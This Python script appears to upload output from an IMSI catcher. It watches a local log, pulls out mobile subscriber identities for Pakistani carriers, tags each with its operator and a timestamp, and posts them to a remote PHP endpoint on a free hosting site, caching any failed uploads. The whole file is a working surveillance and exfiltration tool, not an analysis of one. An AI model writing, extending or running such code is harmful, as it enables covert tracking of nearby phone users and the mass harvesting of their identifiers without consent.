#!/usr/bin/env python3
"""
InfinityFree Auto Uploader for IMSI Data
Run this on your Ubuntu machine
"""

import requests
import os
import time
import re
import json
import socket
import datetime
from pathlib import Path

# ==========================================
# CONFIGURATION - CHANGE THESE!
# ==========================================
UPLOAD_URL = "http://subhanscode.xo.je/imsi_upload.php"
API_TOKEN = "your-secret-token-123"  # Must match PHP file
CACHE_FILE = "infinity_cache.json"

class IMSIUploader:
    def __init__(self):
        self.last_position = 0
        self.upload_count = 0
        self.cache = []
        self.source_ip = self.get_local_ip()
        self.load_cache()
        
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "unknown"
    
    def load_cache(self):
        if os.path.exists(CACHE_FILE):
            try:
                with open(CACHE_FILE, 'r') as f:
                    self.cache = json.load(f)
                print(f"📦 Loaded {len(self.cache)} cached items")
            except:
                self.cache = []
    
    def save_cache(self):
        try:
            with open(CACHE_FILE, 'w') as f:
                json.dump(self.cache[-500:], f)
        except:
            pass
    
    def parse_imsi_line(self, line):
        if not line or line.startswith('Nb IMSI') or line.startswith('stamp'):
            return None
        
        imsi_match = re.search(r'410\s+0[3467]\s+\d+', line)
        if not imsi_match:
            return None
        
        imsi = imsi_match.group(0)
        
        operator = "Unknown"
        if "410 06" in imsi:
            operator = "Telenor"
        elif "410 04" in imsi:
            operator = "Zong"
        elif "410 03" in imsi:
            operator = "Ufone"
        elif "410 01" in imsi or "410 07" in imsi:
            operator = "Jazz"
        
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        time_match = re.search(r'\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}', line)
        if time_match:
            timestamp = time_match.group(0).replace('T', ' ')
        
        return {
            'timestamp': timestamp,
            'imsi': imsi,
            'operator': operator,
            'mcc': '410',
            'cell_id': 0,
            'lat': 0,
            'source_ip': self.source_ip
        }
    
    def upload_data(self, data):
        try:
            response = requests.post(
                UPLOAD_URL,
                json=data,
                headers={'X-API-Token': API_TOKEN},
                timeout=10
            )
            return response.status_code == 200
        except:
            return False
    
    def run(self):
        print("\n" + "="*60)
        print("🚀 INFINITYFREE AUTO UPLOADER")
        print("="*60)
        print(f"📤 Uploading to: {UPLOAD_URL}")
        print(f"📁 Cache file: {CACHE_FILE}")
        print("="*60 + "\n")
        
        if not os.path.exists("imsi_output.txt"):
            Path("imsi_output.txt").touch()
        
        with open("imsi_output.txt", "r") as f:
            f.seek(0, 2)
            self.last_position = f.tell()
            
            while True:
                try:
                    line = f.readline()
                    if line:
                        data = self.parse_imsi_line(line)
                        if data:
                            if self.upload_data(data):
                                self.upload_count += 1
                                print(f"  ✅ [{self.upload_count}] {data['operator']}: {data['imsi']}")
                            else:
                                self.cache.append(data)
                                self.save_cache()
                                print(f"  📦 Cached: {data['operator']}")
                    else:
                        time.sleep(2)
                except KeyboardInterrupt:
                    break
                except:
                    time.sleep(5)

if __name__ == "__main__":
    uploader = IMSIUploader()
    uploader.run()
